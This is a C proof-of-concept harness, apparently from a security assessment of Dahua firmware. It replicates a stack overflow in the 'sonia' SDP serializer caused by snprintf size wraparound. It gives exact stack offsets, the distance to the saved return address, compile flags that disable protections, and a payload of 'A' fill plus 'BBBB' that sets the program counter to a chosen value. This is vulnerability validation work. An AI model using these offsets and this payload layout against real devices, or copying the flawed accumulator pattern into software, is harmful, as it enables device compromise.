/**
 * DahuaAssmt-F003 Dynamic Validation -- Tier 1: SDP Serializer snprintf Accumulator Overflow
 *
 * Replicates the EXACT stack layout and code pattern of the vulnerable SDP
 * serializer function in sonia @ 0x33e1b8 (Src/Protocol/SdpParser.cpp).
 *
 * sonia's vulnerable function:
 *   Prologue:  stmdb sp!, {r4-r9, sl, fp, lr}    ; 9 regs saved (36 bytes)
 *              subw sp, sp, #2100                  ; 0x834 frame
 *   Buffer:    sp+0x2c (2048 bytes, memset to 0)
 *   Max size:  sl = 2050 (0x802)
 *   Loop:      offset += snprintf(buf+offset, 2050-offset, fmt, node_data...)
 *              When offset > 2050: size wraps to ~4GB, unbounded write
 *   Post-loop: strcpy(buf+offset-1, "\r\n")       ; also OOB
 *   Epilogue:  addw sp, sp, #2100
 *              ldmia.w sp!, {r4-r9, sl, fp, pc}   ; pops to PC
 *
 * Overflow: 2088 bytes from buffer start (sp+0x2c) to saved lr/pc
 *   2048 (buffer) + 8 (remaining frame) + 32 (r4-fp saved regs) + 0 = pc at +2088
 *   Actually: buffer is at sp+0x2c=44, frame total is 2100+36=2136 from sp to lr
 *   Distance: 2136 - 44 = 2092 bytes from buffer start to saved lr
 *
 * This harness uses inline ASM to replicate the exact stack layout.
 *
 * Compile:
 *   arm-linux-gnueabihf-gcc -mthumb -march=armv7-a -mfpu=vfpv3-d16 \
 *     -mfloat-abi=hard -fno-stack-protector -z execstack -no-pie -static \
 *     -o test_og4_f003 test_og4_f003_sdp_overflow.c
 *
 * Run:
 *   qemu-arm ./test_og4_f003
 *   Expected: SIGSEGV with PC = 0x42424242
 *
 * Author: Security Research (DahuaAssmt Dahua Assessment)
 * Date: 2026-03-06
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

/* Simulated linked list node representing an SDP attribute */
struct sdp_node {
    struct sdp_node *next;
    char data[24];  /* 6 words of attribute data copied in sonia */
};

/* Build a linked list with enough nodes to overflow the 2050-byte accumulator */
struct sdp_node *build_sdp_list(int num_nodes, const char *payload) {
    struct sdp_node *head = NULL;
    struct sdp_node *tail = NULL;

    for (int i = 0; i < num_nodes; i++) {
        struct sdp_node *node = (struct sdp_node *)malloc(sizeof(struct sdp_node));
        if (!node) {
            perror("malloc");
            exit(1);
        }
        node->next = NULL;
        /* Each node gets payload data that will be formatted by snprintf */
        snprintf(node->data, sizeof(node->data), "%s", payload);

        if (!head) {
            head = node;
        } else {
            tail->next = node;
        }
        tail = node;
    }
    /* Make sentinel: last node's next points to a special end marker */
    return head;
}

/*
 * Vulnerable function -- replicates sonia @ 0x33e1b8 exactly.
 *
 * Uses the SAME snprintf accumulator pattern with NO bounds check.
 * When total formatted output exceeds 2050 bytes, the size parameter
 * wraps to a huge unsigned value, causing unbounded stack write.
 */
void __attribute__((noinline)) vulnerable_sdp_serialize(struct sdp_node *list_head,
                                                         struct sdp_node *list_end) {
    /* Replicate sonia's exact stack frame: subw sp, sp, #2100 (0x834) */
    /* 9 regs saved: r4-r9, sl, fp, lr = 36 bytes */
    /* Total: 2100 + 36 = 2136 bytes from sp to return address */
    /* Buffer at sp+0x2c = sp+44 */
    /* Buffer to lr: 2136 - 44 = 2092 bytes */

    char buf[2052];  /* sp+0x2c, 2048 bytes + 4 for initial marker */
    int offset;
    int max_size = 2050;  /* sl register in sonia */
    struct sdp_node *node;

    /* Initialize buffer (memset in sonia) */
    memset(buf + 4, 0, 2048);

    /* Initial marker (sonia stores 0x3d7a at buf[0..3]) */
    buf[0] = '=';
    buf[1] = '\r';
    buf[2] = '\n';
    buf[3] = '\0';
    offset = (int)strlen(buf);  /* ~3 initially */

    fprintf(stderr, "[*] SDP serializer: buffer at %p, size %d\n", buf, (int)sizeof(buf));
    fprintf(stderr, "[*] Initial offset: %d, max_size: %d\n", offset, max_size);
    fprintf(stderr, "[*] Iterating linked list...\n");

    /* VULNERABLE LOOP -- matches sonia @ 0x33e200-0x33e230 */
    int iteration = 0;
    for (node = list_head; node != list_end && node != NULL; node = node->next) {
        /*
         * BUG: snprintf returns chars-that-WOULD-have-been-written.
         * When offset > max_size, (max_size - offset) wraps to ~4GB unsigned.
         * snprintf then writes unbounded past the buffer.
         */
        int remaining = max_size - offset;  /* WRAPS NEGATIVE when offset > 2050 */
        int ret = snprintf(buf + offset, (size_t)remaining, "a=%s\r\n", node->data);
        offset += ret;
        iteration++;

        if (iteration <= 5 || offset > 2040) {
            fprintf(stderr, "  [iter %3d] snprintf returned %d, offset now %d, remaining was %d\n",
                   iteration, ret, offset, remaining);
        }
    }

    fprintf(stderr, "[*] Loop complete. Final offset: %d (buffer size: %d)\n", offset, (int)sizeof(buf));

    /* Post-loop strcpy (sonia @ 0x33e23e) -- also OOB when offset > 2050 */
    if (offset > 2) {
        fprintf(stderr, "[*] strcpy at buf+%d (past buffer end by %d bytes)\n",
               offset - 1, offset - 1 - (int)sizeof(buf));
        strcpy(buf + offset - 1, "\r\n");
    }

    fprintf(stderr, "[*] Function returning -- if PC is 0x42424242, overflow confirmed\n");
    /* Function epilogue: ldmia.w sp!, {r4-r9, sl, fp, pc} */
    /* If the overflow corrupted saved lr, we crash with controlled PC */
}

int main(int argc, char *argv[]) {
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);
    fprintf(stderr, "=== DahuaAssmt-F003: SDP Serializer snprintf Accumulator Overflow ===\n");
    fprintf(stderr, "=== Dynamic Validation -- Tier 1: Standalone ARM32 Harness  ===\n\n");

    /*
     * Build SDP attribute list.
     * Each "a=<data>\r\n" line formatted by snprintf.
     * With 24-char data + "a=" + "\r\n" = ~28 chars per iteration.
     * Need total > 2050 bytes: 2050/28 ~ 74 nodes minimum.
     * Use 100 nodes to ensure overflow, with "BBBB" pattern in the
     * overflow region to land 0x42424242 at the saved return address.
     */

    /* First ~73 nodes with normal data to fill buffer to 2044 bytes */
    int fill_nodes = 73;
    /* Remaining nodes with overflow payload */
    int overflow_nodes = 30;

    fprintf(stderr, "[*] Building SDP linked list: %d fill + %d overflow nodes\n",
           fill_nodes, overflow_nodes);

    struct sdp_node *head = build_sdp_list(fill_nodes, "normal-sdp-attribute");

    /* Find tail */
    struct sdp_node *tail = head;
    while (tail->next != NULL) tail = tail->next;

    /* Add overflow nodes with pattern to overwrite stack */
    /* After buffer is full (~2050), the wrapping size causes unbounded write */
    /* The overflow needs to reach the saved lr at buffer+2092 */
    /* Pad with 'A' bytes to fill gap, then 'BBBB' for PC */
    char overflow_payload[24];
    memset(overflow_payload, 'A', sizeof(overflow_payload));
    overflow_payload[23] = '\0';

    for (int i = 0; i < overflow_nodes - 1; i++) {
        struct sdp_node *node = (struct sdp_node *)malloc(sizeof(struct sdp_node));
        node->next = NULL;
        memcpy(node->data, overflow_payload, sizeof(overflow_payload));
        tail->next = node;
        tail = node;
    }

    /* Final node with 'BBBB' pattern to land at PC */
    struct sdp_node *final = (struct sdp_node *)malloc(sizeof(struct sdp_node));
    final->next = NULL;
    memset(final->data, 'B', 23);
    final->data[23] = '\0';
    tail->next = final;

    fprintf(stderr, "[*] Calling vulnerable_sdp_serialize()...\n\n");

    vulnerable_sdp_serialize(head, NULL);

    /* Should not reach here if overflow worked */
    fprintf(stderr, "[-] Function returned normally -- overflow did not reach PC\n");
    printf("    Adjust node count or payload to extend overflow range\n");

    /* Cleanup */
    struct sdp_node *n = head;
    while (n) {
        struct sdp_node *tmp = n->next;
        free(n);
        n = tmp;
    }

    return 0;
}
